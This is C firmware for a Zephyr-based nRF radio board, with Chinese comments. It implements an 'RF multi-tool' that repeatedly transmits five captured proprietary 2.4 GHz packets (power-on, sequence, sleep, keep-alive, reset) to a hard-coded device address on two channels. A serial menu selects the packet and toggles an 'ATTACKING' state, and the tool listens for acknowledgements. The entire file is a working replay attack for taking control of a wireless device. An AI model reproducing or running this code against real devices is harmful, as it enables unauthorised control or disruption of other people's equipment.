#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <hal/nrf_radio.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/gpio.h>
#include <zephyr/drivers/uart.h>
#include <string.h>

// ==========================================================
// 📡 參數設定區
// ==========================================================

// 雙頻掃射 (Channel 4 & 78)
static const uint8_t TARGET_FREQS[] = {4, 78};
#define TARGET_ADDR_BASE   0xd235cf35
#define TARGET_ADDR_PREFIX 0x00

// ==========================================================
// 💾 數據庫 (你抓到的訊號)
// ==========================================================

// [模式 1] 開機指令 (Power On - Golden Packet)
// Data: 16 00 00 21 20 80...
static const uint8_t PAYLOAD_POWER_ON[] = {
    0x16, 0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0x7F, 0xF0, 0x10, 0x04, 0x70, 0x0D, 0xBF, 0xF0, 0xBF,
    0xC1, 0x60, 0x28, 0x71, 0x60, 0x02, 0xF1, 0x87, 0x96, 0x57, 0xC6, 0x67, 0xFE, 0x06, 0xA4, 0x2F
};

// [模式 2] 第二階段指令 (Seq 1C)
// Data: 1C 00 00 21 80 B0...
static const uint8_t PAYLOAD_SEQ_2[] = {
    0x1C, 0x00, 0x00, 0x21, 0x80, 0xB0, 0x0F, 0x8F, 0xF0, 0x10, 0x04, 0x90, 0x0D, 0xBF, 0xF1, 0x1F,
    0xC1, 0xA0, 0x20, 0x10, 0x60, 0x42, 0xCA, 0x47, 0xEE, 0xA7, 0xD9, 0x47, 0xD3, 0x99, 0x04, 0x40
};

// [模式 3] 休眠指令 (Sleep?)
// Data: 16 00 00 21 20 90... (可能是叫它去睡覺)
static const uint8_t PAYLOAD_SLEEP[] = {
    0x16, 0x00, 0x00, 0x21, 0x20, 0x90, 0x0F, 0x3F, 0xF0, 0x20, 0x04, 0xF0, 0x0E, 0x6F, 0xF0, 0xFF,
    0xCF, 0xA0, 0x1A, 0xC8, 0x50, 0x2E, 0x76, 0x0A, 0x4C, 0x47, 0x4B, 0xA2, 0x65, 0x00, 0x19, 0x0A
};

// [模式 4] 心跳包/閒置 (Keep-Alive)
// Data: 0A 00 00 20...
static const uint8_t PAYLOAD_KEEPALIVE[] = {
    0x0A, 0x00, 0x00, 0x20, 0x6B, 0xA7, 0xCE, 0xE7, 0xD6, 0x97, 0xE9, 0x80, 0x0E, 0x4F, 0xCC, 0x52,
    0xE9, 0xA0, 0x14, 0xA8, 0x41, 0x16, 0x50, 0x12, 0x51, 0x26, 0x67, 0x07, 0xE5, 0x0E, 0x97, 0x7C
};

// [模式 5] 重置/斷線 (Reset/Link Layer)
// Data: 15 20 40 07...
static const uint8_t PAYLOAD_RESET[] = {
    0x15, 0x20, 0x40, 0x07, 0xC0, 0x00, 0x00, 0x05, 0x50, 0x00, 0x00, 0x80, 0x0B, 0x13, 0x22, 0xE5,
    0x2B, 0x90, 0x01, 0x97, 0xEA, 0x1F, 0x5B, 0xD4, 0xC1, 0x91, 0xC8, 0x87, 0xE5, 0x6E, 0xFD, 0x1D
};

// ==========================================================

#define LED0_NODE DT_ALIAS(led0)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
const struct device *uart_dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));

static uint8_t packet_buffer[64];
static uint8_t rx_buffer[64];

// 當前攻擊狀態
static const uint8_t *current_payload = NULL;
static size_t current_payload_len = 0;
static bool attack_active = false;

// Radio 初始化
void radio_init_common(void) {
    NRF_RADIO->POWER = 0;
    k_busy_wait(500);
    NRF_RADIO->POWER = 1;
    
    // CRC 開啟
    NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
    NRF_RADIO->CRCPOLY = 0x11021; 
    NRF_RADIO->CRCINIT = 0xFFFF;
    NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
    NRF_RADIO->PCNF0 = (8UL << RADIO_PCNF0_LFLEN_Pos);
    NRF_RADIO->PCNF1 = (60UL << RADIO_PCNF1_MAXLEN_Pos) | (4UL << RADIO_PCNF1_BALEN_Pos) | (1UL << RADIO_PCNF1_ENDIAN_Pos);
    NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
    NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
    NRF_RADIO->TXADDRESS = 0; 
    NRF_RADIO->RXADDRESSES = 1; 
}

// 發射並監聽
void send_on_freq(uint8_t freq) {
    if (!current_payload) return;

    radio_disable();
    NRF_RADIO->FREQUENCY = freq;
    
    // 填入當前選定的 Payload
    memcpy(packet_buffer, current_payload, current_payload_len);
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;
    
    // TX
    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk; 
    NRF_RADIO->EVENTS_END = 0;
    NRF_RADIO->TASKS_TXEN = 1;
    while (NRF_RADIO->EVENTS_END == 0); 
    NRF_RADIO->EVENTS_END = 0;
    
    // RX (Wait for ACK)
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;

    NRF_RADIO->PACKETPTR = (uint32_t)rx_buffer;
    NRF_RADIO->TASKS_RXEN = 1; 

    // Timeout 2ms
    int64_t timeout = k_uptime_get() + 2; 
    while (k_uptime_get() < timeout) {
        if (NRF_RADIO->EVENTS_END) {
            if (NRF_RADIO->CRCSTATUS == 1) {
                int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
                printk(">>> [HIT!] ACK on %d MHz | RSSI: %d\n", 2400+freq, rssi);
                for(int i=0;i<5;i++) {
                    gpio_pin_toggle_dt(&led);
                    k_busy_wait(50000);
                }
                break; 
            }
            NRF_RADIO->EVENTS_END = 0;
            NRF_RADIO->TASKS_START = 1;
        }
    }
}

void radio_disable(void) {
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;
}

// 顯示選單
void print_menu() {
    printk("\n\n========================================\n");
    printk("   RF MULTI-TOOL (Addr: 00 D2 35 CF 35)\n");
    printk("========================================\n");
    printk(" [1] Power ON (Golden Packet)  <-- TRY THIS!\n");
    printk(" [2] Seq 1C (After Power On)\n");
    printk(" [3] Sleep Command\n");
    printk(" [4] Keep-Alive (Idle)\n");
    printk(" [5] Reset/Link Layer\n");
    printk(" [0] STOP Attack\n");
    printk("----------------------------------------\n");
    printk(" Current Mode: %s\n", attack_active ? "ATTACKING" : "IDLE");
    printk(" Select Option: ");
}

// 串口輸入處理 (中斷觸發)
void uart_cb(const struct device *dev, void *user_data) {
    uint8_t c;
    if (!uart_irq_update(dev)) return;
    if (!uart_irq_rx_ready(dev)) return;

    while (uart_fifo_read(dev, &c, 1) == 1) {
        switch (c) {
            case '1':
                current_payload = PAYLOAD_POWER_ON;
                current_payload_len = sizeof(PAYLOAD_POWER_ON);
                attack_active = true;
                printk("\n>>> MODE: POWER ON SET! <<<\n");
                break;
            case '2':
                current_payload = PAYLOAD_SEQ_2;
                current_payload_len = sizeof(PAYLOAD_SEQ_2);
                attack_active = true;
                printk("\n>>> MODE: SEQ 1C SET! <<<\n");
                break;
            case '3':
                current_payload = PAYLOAD_SLEEP;
                current_payload_len = sizeof(PAYLOAD_SLEEP);
                attack_active = true;
                printk("\n>>> MODE: SLEEP SET! <<<\n");
                break;
            case '4':
                current_payload = PAYLOAD_KEEPALIVE;
                current_payload_len = sizeof(PAYLOAD_KEEPALIVE);
                attack_active = true;
                printk("\n>>> MODE: KEEP-ALIVE SET! <<<\n");
                break;
            case '5':
                current_payload = PAYLOAD_RESET;
                current_payload_len = sizeof(PAYLOAD_RESET);
                attack_active = true;
                printk("\n>>> MODE: RESET SET! <<<\n");
                break;
            case '0':
                attack_active = false;
                current_payload = NULL;
                printk("\n>>> ATTACK STOPPED <<<\n");
                break;
            default:
                print_menu();
                break;
        }
    }
}

int main(void) {
    usb_enable(NULL);
    if (device_is_ready(led.port)) {
        gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
    }
    
    // 設定 UART 中斷
    uart_irq_callback_user_data_set(uart_dev, uart_cb, NULL);
    uart_irq_rx_enable(uart_dev);

    radio_init_common();
    
    // 等待 USB 連線穩定
    k_sleep(K_SECONDS(2));
    print_menu();

    int freq_idx = 0;

    while (1) {
        if (attack_active && current_payload != NULL) {
            send_on_freq(TARGET_FREQS[freq_idx]);
            
            // 雙頻切換
            freq_idx++;
            if (freq_idx >= 2) freq_idx = 0;
            
            // 閃爍燈號
            gpio_pin_toggle_dt(&led);
        } else {
            // 閒置時呼吸燈
            gpio_pin_toggle_dt(&led);
            k_sleep(K_MSEC(500));
        }
    }
}
